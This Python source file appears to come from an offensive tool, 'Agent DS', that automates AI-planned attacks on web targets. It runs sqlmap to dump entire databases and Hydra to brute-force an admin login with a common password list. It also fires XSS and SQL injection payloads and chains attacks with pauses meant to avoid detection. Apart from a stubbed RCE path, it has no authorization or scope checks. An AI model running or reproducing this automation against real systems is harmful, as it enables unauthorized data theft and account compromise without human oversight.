"""
Agent DS Attack Execution Engine
Integrates exploitation tools with AI-driven attack chaining
"""

import asyncio
import subprocess
import json
import uuid
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple
import logging
import tempfile
import os
from pathlib import Path

from core.config.settings import Config
from core.database.manager import DatabaseManager
from core.utils.logger import get_logger, log_attack_event

logger = get_logger('attack_engine')

class AttackEngine:
    """Main attack execution engine for Agent DS"""
    
    def __init__(self):
        self.config = Config()
        self.db_manager = DatabaseManager()
        
        # Initialize attack tools
        self.tools = {
            'sqlmap': SQLMapExecutor(self.config),
            'metasploit': MetasploitExecutor(self.config),
            'hydra': HydraExecutor(self.config),
            'zap': ZAPExecutor(self.config),
            'nikto': NiktoExecutor(self.config),
            'custom': CustomPayloadExecutor(self.config)
        }
        
        self.sandbox_mode = self.config.get('security.sandbox_mode', False)
        
    async def execute_attacks(self, execution_config: Dict[str, Any], 
                            mission_id: Optional[str] = None) -> Dict[str, Any]:
        """Execute AI-planned attacks"""
        logger.info("Starting attack execution")
        
        results = {
            'execution_started': datetime.now().isoformat(),
            'attacks': [],
            'success_count': 0,
            'failure_count': 0,
            'dry_run': execution_config.get('dry_run', False),
            'auto_mode': execution_config.get('auto_mode', False)
        }
        
        try:
            # Get attack plan from database or use provided plan
            attack_plan = await self._get_attack_plan(mission_id, execution_config)
            
            if not attack_plan or not attack_plan.get('attack_vectors'):
                raise ValueError("No attack plan available for execution")
            
            # Execute attacks based on mode
            if execution_config.get('auto_mode', False):
                results = await self._execute_auto_mode(attack_plan, results, mission_id)
            else:
                specific_vector = execution_config.get('specific_vector')
                results = await self._execute_specific_vector(attack_plan, specific_vector, results, mission_id)
            
            # Calculate final statistics
            results['execution_completed'] = datetime.now().isoformat()
            results['success_rate'] = (results['success_count'] / max(len(results['attacks']), 1)) * 100
            
            # Log attack completion
            log_attack_event(
                'ATTACK_EXECUTION_COMPLETED',
                f"Mission {mission_id}",
                results['success_count'] > 0,
                {
                    'total_attacks': len(results['attacks']),
                    'success_count': results['success_count'],
                    'success_rate': results['success_rate']
                },
                mission_id=mission_id
            )
            
            logger.info(f"Attack execution completed: {results['success_count']}/{len(results['attacks'])} successful")
            return results
            
        except Exception as e:
            logger.error(f"Attack execution failed: {str(e)}")
            raise
    
    async def _get_attack_plan(self, mission_id: Optional[str], 
                             execution_config: Dict[str, Any]) -> Dict[str, Any]:
        """Get attack plan from various sources"""
        # For demonstration, return a mock attack plan
        # In practice, this would retrieve from AI orchestrator or database
        return {
            'attack_vectors': [
                {
                    'id': 'sql_001',
                    'attack_type': 'sql_injection',
                    'target': 'http://example.com/login.php',
                    'method': 'UNION',
                    'tools': ['sqlmap'],
                    'payloads': [
                        {
                            'id': 'payload_001',
                            'payload': "' UNION SELECT 1,2,3--",
                            'description': 'UNION SELECT probe'
                        }
                    ],
                    'success_probability': 0.7,
                    'estimated_duration': 30
                },
                {
                    'id': 'xss_001',
                    'attack_type': 'xss',
                    'target': 'http://example.com/search.php',
                    'method': 'REFLECTED',
                    'tools': ['custom'],
                    'payloads': [
                        {
                            'id': 'payload_002',
                            'payload': '<script>alert("XSS")</script>',
                            'description': 'Basic XSS payload'
                        }
                    ],
                    'success_probability': 0.5,
                    'estimated_duration': 15
                }
            ]
        }
    
    async def _execute_auto_mode(self, attack_plan: Dict, results: Dict, 
                               mission_id: Optional[str]) -> Dict:
        """Execute all attacks in automatic mode"""
        attack_vectors = attack_plan.get('attack_vectors', [])
        
        for vector in attack_vectors:
            attack_result = await self._execute_attack_vector(vector, results.get('dry_run', False), mission_id)
            results['attacks'].append(attack_result)
            
            if attack_result.get('success', False):
                results['success_count'] += 1
            else:
                results['failure_count'] += 1
            
            # Add delay between attacks to avoid detection
            await asyncio.sleep(2)
        
        return results
    
    async def _execute_specific_vector(self, attack_plan: Dict, vector_id: Optional[str], 
                                     results: Dict, mission_id: Optional[str]) -> Dict:
        """Execute specific attack vector"""
        attack_vectors = attack_plan.get('attack_vectors', [])
        
        if vector_id:
            # Find specific vector
            vector = next((v for v in attack_vectors if v.get('id') == vector_id), None)
            if not vector:
                raise ValueError(f"Attack vector {vector_id} not found")
            vectors_to_execute = [vector]
        else:
            # Execute first vector if no specific one provided
            vectors_to_execute = attack_vectors[:1]
        
        for vector in vectors_to_execute:
            attack_result = await self._execute_attack_vector(vector, results.get('dry_run', False), mission_id)
            results['attacks'].append(attack_result)
            
            if attack_result.get('success', False):
                results['success_count'] += 1
            else:
                results['failure_count'] += 1
        
        return results
    
    async def _execute_attack_vector(self, vector: Dict, dry_run: bool, 
                                   mission_id: Optional[str]) -> Dict:
        """Execute a single attack vector"""
        attack_id = str(uuid.uuid4())
        attack_type = vector.get('attack_type')
        target = vector.get('target')
        tools = vector.get('tools', ['custom'])
        
        logger.info(f"Executing {attack_type} attack against {target}")
        
        attack_result = {
            'id': attack_id,
            'vector_id': vector.get('id'),
            'attack_type': attack_type,
            'target': target,
            'tools_used': [],
            'payloads_tested': [],
            'success': False,
            'start_time': datetime.now().isoformat(),
            'dry_run': dry_run,
            'results': {},
            'error_message': None
        }
        
        try:
            if dry_run:
                # Simulate attack execution
                attack_result.update(await self._simulate_attack(vector))
            else:
                # Execute real attack
                attack_result.update(await self._execute_real_attack(vector))
            
            attack_result['end_time'] = datetime.now().isoformat()
            
            # Store attack result in database
            if mission_id:
                self.db_manager.store_attack_attempt(
                    mission_id=mission_id,
                    target=target,
                    attack_type=attack_type,
                    tool_name=','.join(attack_result.get('tools_used', [])),
                    success=attack_result.get('success', False),
                    result_data=attack_result.get('results', {}),
                    error_message=attack_result.get('error_message'),
                    metadata={'vector_id': vector.get('id'), 'attack_id': attack_id}
                )
            
            # Log attack event
            log_attack_event(
                attack_type,
                target,
                attack_result.get('success', False),
                attack_result.get('results', {}),
                mission_id=mission_id,
                tool_name=','.join(attack_result.get('tools_used', []))
            )
            
        except Exception as e:
            attack_result['error_message'] = str(e)
            attack_result['end_time'] = datetime.now().isoformat()
            logger.error(f"Attack execution failed: {str(e)}")
        
        return attack_result
    
    async def _simulate_attack(self, vector: Dict) -> Dict:
        """Simulate attack execution for dry-run mode"""
        await asyncio.sleep(1)  # Simulate execution time
        
        # Mock results based on success probability
        import random
        success_probability = vector.get('success_probability', 0.5)
        success = random.random() < success_probability
        
        return {
            'success': success,
            'tools_used': vector.get('tools', ['custom']),
            'payloads_tested': [p.get('id') for p in vector.get('payloads', [])],
            'results': {
                'simulated': True,
                'success_probability': success_probability,
                'message': 'Attack simulated successfully' if success else 'Attack simulation failed'
            }
        }
    
    async def _execute_real_attack(self, vector: Dict) -> Dict:
        """Execute real attack"""
        attack_type = vector.get('attack_type')
        tools = vector.get('tools', ['custom'])
        
        # Select primary tool for execution
        primary_tool = tools[0] if tools else 'custom'
        
        if primary_tool in self.tools:
            executor = self.tools[primary_tool]
            return await executor.execute(vector)
        else:
            # Fall back to custom executor
            return await self.tools['custom'].execute(vector)

class BaseExecutor:
    """Base class for attack tool executors"""
    
    def __init__(self, config: Config):
        self.config = config
        self.logger = get_logger(self.__class__.__name__.lower())
    
    async def execute(self, vector: Dict) -> Dict:
        """Override in subclasses"""
        raise NotImplementedError
    
    def _is_tool_available(self, tool_name: str) -> bool:
        """Check if tool is available in system"""
        import shutil
        return shutil.which(tool_name) is not None

class SQLMapExecutor(BaseExecutor):
    """SQLMap executor for SQL injection attacks"""
    
    async def execute(self, vector: Dict) -> Dict:
        """Execute SQLMap attack"""
        if not self._is_tool_available('sqlmap'):
            return {
                'success': False,
                'tools_used': ['sqlmap'],
                'error_message': 'SQLMap not available',
                'results': {}
            }
        
        target = vector.get('target')
        payloads = vector.get('payloads', [])
        
        # Build SQLMap command
        cmd = [
            'sqlmap',
            '-u', target,
            '--batch',
            '--no-cast',
            '--dump-all',
            '--exclude-sysdbs',
            '--timeout=30',
            '--retries=2'
        ]
        
        try:
            # Execute SQLMap
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=120)
            
            # Parse SQLMap output
            output = stdout.decode() + stderr.decode()
            success = 'vulnerable' in output.lower() or 'injection' in output.lower()
            
            return {
                'success': success,
                'tools_used': ['sqlmap'],
                'payloads_tested': [p.get('id') for p in payloads],
                'results': {
                    'vulnerable': success,
                    'output': output[:1000],  # Truncate output
                    'return_code': process.returncode
                }
            }
            
        except asyncio.TimeoutError:
            return {
                'success': False,
                'tools_used': ['sqlmap'],
                'error_message': 'SQLMap execution timeout',
                'results': {}
            }
        except Exception as e:
            return {
                'success': False,
                'tools_used': ['sqlmap'],
                'error_message': str(e),
                'results': {}
            }

class MetasploitExecutor(BaseExecutor):
    """Metasploit executor for exploitation"""
    
    async def execute(self, vector: Dict) -> Dict:
        """Execute Metasploit exploit"""
        if not self._is_tool_available('msfconsole'):
            return {
                'success': False,
                'tools_used': ['metasploit'],
                'error_message': 'Metasploit not available',
                'results': {}
            }
        
        target = vector.get('target')
        attack_type = vector.get('attack_type')
        
        # Create Metasploit resource script
        resource_script = self._create_msf_resource_script(vector)
        
        try:
            # Write resource script to temporary file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                f.write(resource_script)
                resource_file = f.name
            
            # Execute Metasploit
            cmd = ['msfconsole', '-q', '-r', resource_file]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=180)
            
            # Clean up resource file
            os.unlink(resource_file)
            
            # Parse Metasploit output
            output = stdout.decode() + stderr.decode()
            success = 'session' in output.lower() or 'exploit completed' in output.lower()
            
            return {
                'success': success,
                'tools_used': ['metasploit'],
                'results': {
                    'session_created': success,
                    'output': output[:1000],
                    'return_code': process.returncode
                }
            }
            
        except Exception as e:
            return {
                'success': False,
                'tools_used': ['metasploit'],
                'error_message': str(e),
                'results': {}
            }
    
    def _create_msf_resource_script(self, vector: Dict) -> str:
        """Create Metasploit resource script"""
        target = vector.get('target')
        attack_type = vector.get('attack_type')
        
        # Simple resource script template
        script = f"""
use auxiliary/scanner/http/http_version
set RHOSTS {target}
run
exit
"""
        return script

class HydraExecutor(BaseExecutor):
    """Hydra executor for brute force attacks"""
    
    async def execute(self, vector: Dict) -> Dict:
        """Execute Hydra brute force attack"""
        if not self._is_tool_available('hydra'):
            return {
                'success': False,
                'tools_used': ['hydra'],
                'error_message': 'Hydra not available',
                'results': {}
            }
        
        target = vector.get('target')
        service = vector.get('service', 'ssh')
        
        # Build Hydra command
        cmd = [
            'hydra',
            '-l', 'admin',
            '-P', '/usr/share/wordlists/rockyou.txt',
            '-t', '4',
            '-f',
            target,
            service
        ]
        
        try:
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=300)
            
            output = stdout.decode() + stderr.decode()
            success = 'valid password' in output.lower() or 'login:' in output.lower()
            
            return {
                'success': success,
                'tools_used': ['hydra'],
                'results': {
                    'credentials_found': success,
                    'output': output[:1000],
                    'return_code': process.returncode
                }
            }
            
        except Exception as e:
            return {
                'success': False,
                'tools_used': ['hydra'],
                'error_message': str(e),
                'results': {}
            }

class ZAPExecutor(BaseExecutor):
    """OWASP ZAP executor for web application scanning"""
    
    async def execute(self, vector: Dict) -> Dict:
        """Execute ZAP scan"""
        # For demonstration, return mock results
        # In practice, this would integrate with ZAP API
        target = vector.get('target')
        
        await asyncio.sleep(2)  # Simulate scan time
        
        return {
            'success': True,
            'tools_used': ['zap'],
            'results': {
                'vulnerabilities_found': 3,
                'scan_completed': True,
                'target': target
            }
        }

class NiktoExecutor(BaseExecutor):
    """Nikto executor for web server scanning"""
    
    async def execute(self, vector: Dict) -> Dict:
        """Execute Nikto scan"""
        if not self._is_tool_available('nikto'):
            return {
                'success': False,
                'tools_used': ['nikto'],
                'error_message': 'Nikto not available',
                'results': {}
            }
        
        target = vector.get('target')
        
        cmd = ['nikto', '-h', target, '-Format', 'txt']
        
        try:
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=300)
            
            output = stdout.decode() + stderr.decode()
            success = 'vulnerabilities' in output.lower() or 'issues' in output.lower()
            
            return {
                'success': success,
                'tools_used': ['nikto'],
                'results': {
                    'scan_completed': True,
                    'output': output[:1000],
                    'return_code': process.returncode
                }
            }
            
        except Exception as e:
            return {
                'success': False,
                'tools_used': ['nikto'],
                'error_message': str(e),
                'results': {}
            }

class CustomPayloadExecutor(BaseExecutor):
    """Custom payload executor for AI-generated attacks"""
    
    async def execute(self, vector: Dict) -> Dict:
        """Execute custom payloads"""
        attack_type = vector.get('attack_type')
        target = vector.get('target')
        payloads = vector.get('payloads', [])
        
        if attack_type == 'xss':
            return await self._execute_xss_payloads(target, payloads)
        elif attack_type == 'sql_injection':
            return await self._execute_sqli_payloads(target, payloads)
        elif attack_type == 'rce':
            return await self._execute_rce_payloads(target, payloads)
        else:
            return await self._execute_generic_payloads(target, payloads)
    
    async def _execute_xss_payloads(self, target: str, payloads: List[Dict]) -> Dict:
        """Execute XSS payloads"""
        import aiohttp
        from urllib.parse import quote
        
        success = False
        results = {'tested_payloads': [], 'successful_payloads': []}
        
        try:
            async with aiohttp.ClientSession() as session:
                for payload_info in payloads:
                    payload = payload_info.get('payload', '')
                    test_url = f"{target}?q={quote(payload)}"
                    
                    try:
                        async with session.get(test_url, timeout=10) as response:
                            content = await response.text()
                            
                            if payload in content:
                                success = True
                                results['successful_payloads'].append(payload_info)
                            
                            results['tested_payloads'].append({
                                'payload': payload,
                                'status_code': response.status,
                                'reflected': payload in content
                            })
                    
                    except Exception as e:
                        results['tested_payloads'].append({
                            'payload': payload,
                            'error': str(e)
                        })
        
        except Exception as e:
            return {
                'success': False,
                'tools_used': ['custom'],
                'error_message': str(e),
                'results': {}
            }
        
        return {
            'success': success,
            'tools_used': ['custom'],
            'payloads_tested': [p.get('id') for p in payloads],
            'results': results
        }
    
    async def _execute_sqli_payloads(self, target: str, payloads: List[Dict]) -> Dict:
        """Execute SQL injection payloads"""
        import aiohttp
        from urllib.parse import quote
        
        success = False
        results = {'tested_payloads': [], 'sql_errors': []}
        
        sql_error_indicators = [
            'sql syntax', 'mysql error', 'postgresql', 'ora-',
            'sqlite', 'column', 'table', 'syntax error'
        ]
        
        try:
            async with aiohttp.ClientSession() as session:
                for payload_info in payloads:
                    payload = payload_info.get('payload', '')
                    test_url = f"{target}?id={quote(payload)}"
                    
                    try:
                        async with session.get(test_url, timeout=10) as response:
                            content = await response.text().lower()
                            
                            sql_error_found = any(error in content for error in sql_error_indicators)
                            
                            if sql_error_found:
                                success = True
                                results['sql_errors'].append(payload_info)
                            
                            results['tested_payloads'].append({
                                'payload': payload,
                                'status_code': response.status,
                                'sql_error': sql_error_found
                            })
                    
                    except Exception as e:
                        results['tested_payloads'].append({
                            'payload': payload,
                            'error': str(e)
                        })
        
        except Exception as e:
            return {
                'success': False,
                'tools_used': ['custom'],
                'error_message': str(e),
                'results': {}
            }
        
        return {
            'success': success,
            'tools_used': ['custom'],
            'payloads_tested': [p.get('id') for p in payloads],
            'results': results
        }
    
    async def _execute_rce_payloads(self, target: str, payloads: List[Dict]) -> Dict:
        """Execute RCE payloads"""
        # For security reasons, RCE testing should be very carefully controlled
        # This is a placeholder implementation
        await asyncio.sleep(1)
        
        return {
            'success': False,
            'tools_used': ['custom'],
            'payloads_tested': [p.get('id') for p in payloads],
            'results': {
                'message': 'RCE testing requires additional authorization',
                'safety_mode': True
            }
        }
    
    async def _execute_generic_payloads(self, target: str, payloads: List[Dict]) -> Dict:
        """Execute generic payloads"""
        await asyncio.sleep(1)
        
        return {
            'success': False,
            'tools_used': ['custom'],
            'payloads_tested': [p.get('id') for p in payloads],
            'results': {
                'message': 'Generic payload execution completed',
                'target': target
            }
        }